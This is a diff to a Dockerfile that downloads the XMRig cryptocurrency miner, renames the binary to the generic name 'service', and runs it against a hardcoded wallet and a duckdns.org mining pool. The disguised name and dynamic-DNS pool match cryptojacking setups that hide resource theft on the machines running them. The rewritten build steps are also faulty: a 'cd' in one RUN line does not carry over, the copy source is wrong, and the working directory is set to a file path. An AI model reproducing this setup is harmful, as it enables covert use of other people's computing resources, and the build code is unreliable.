@@ -1,28 +1,17 @@
 FROM alpine:latest
 
-ARG XMRIG_VERSION='v6.20.0'
-WORKDIR /servis
+RUN wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
+RUN tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
+RUN cd xmrig-6.20.0
+RUN mv xmrig service
 
-RUN git clone https://github.com/xmrig/xmrig && \
-    mkdir xmrig/build && \
-    cd xmrig && git checkout ${XMRIG_VERSION}
+COPY service /usr/local/bin/service
+RUN chmod +x /usr/local/bin/service
 
-COPY supportxmr.patch /servis/xmrig
-RUN cd xmrig && git apply supportxmr.patch
-
-RUN cd xmrig/build && \
-    cmake .. -DCMAKE_BUILD_TYPE=Release && \
-    make -j$(nproc) 
-
-
-FROM alpine:latest
+WORKDIR /usr/local/bin/service
 
 ENV WALLET=ZEPHYR2TFLiNGW2zGrJrbc43kdT9Vmx5ugKGBHHoZ4oxeS7X3X1xqEb5NCXjVNfAXthHHWQ8cd6XfcGYsLVgYRuK5642R48cXRH4Z
 ENV POOL=imboost.duckdns.org:1123
 ENV WORKER_NAME=x
-
-WORKDIR /xmr
-COPY --from=builder /servis/xmrig/build/xmrig /xmr
-RUN mv xmrig service 
 
 CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --algo=rx/0"]
